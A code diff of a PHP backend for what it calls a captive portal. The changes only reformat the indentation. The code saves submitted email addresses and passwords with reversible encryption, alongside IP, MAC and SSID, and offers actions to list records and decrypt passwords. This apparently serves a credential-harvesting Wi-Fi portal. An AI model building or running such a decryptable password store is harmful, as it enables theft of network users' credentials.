@@ -13,7 +13,7 @@ $accion = $_GET['action'] ?? ($_POST['action'] ?? '');
 
 if ($accion === 'listar') {
     try {
-	$stmt = $pdo->query("SELECT id, correo, contrasena, ip, mac, ssid, fecha FROM portal_registros ORDER BY fecha DESC LIMIT 500");
+        $stmt = $pdo->query("SELECT id, correo, contrasena, ip, mac, ssid, fecha FROM portal_registros ORDER BY fecha DESC LIMIT 500");
         $registros = $stmt->fetchAll();
         echo json_encode(['ok' => true, 'registros' => $registros]);
     } catch (Exception $e) {
@@ -58,14 +58,14 @@ if ($accion === 'guardar_registro' && $_SERVER['REQUEST_METHOD'] === 'POST') {
             exit();
         }
 
-	global $cipherKey;
-	$contrasena_cifrada = encryptData($contrasena, $cipherKey);
+        global $cipherKey;
+        $contrasena_cifrada = encryptData($contrasena, $cipherKey);
 
-	$stmt = $pdo->prepare("
-    	    INSERT INTO portal_registros (correo, contrasena, ip, mac, ssid, user_id)
-   	    VALUES (?, ?, ?, ?, ?, ?)
-	");
-	$stmt->execute([$correo, $contrasena_cifrada, $ip, $mac, $ssid, $_SESSION['user_id']]);
+        $stmt = $pdo->prepare("
+            INSERT INTO portal_registros (correo, contrasena, ip, mac, ssid, user_id)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ");
+        $stmt->execute([$correo, $contrasena_cifrada, $ip, $mac, $ssid, $_SESSION['user_id']]);
 
         logActividad('Portal Cautivo', 'Nuevo registro: ' . $correo . ' (MAC: ' . $mac . ', IP: ' . $ip . ')');
 
@@ -76,6 +76,7 @@ if ($accion === 'guardar_registro' && $_SERVER['REQUEST_METHOD'] === 'POST') {
     }
     exit();
 }
+
 if ($accion === 'descifrar') {
     $id = intval($_GET['id'] ?? 0);
     if (!$id) {
@@ -99,4 +100,5 @@ if ($accion === 'descifrar') {
     }
     exit();
 }
+
 echo json_encode(['error' => 'accion_invalida']);
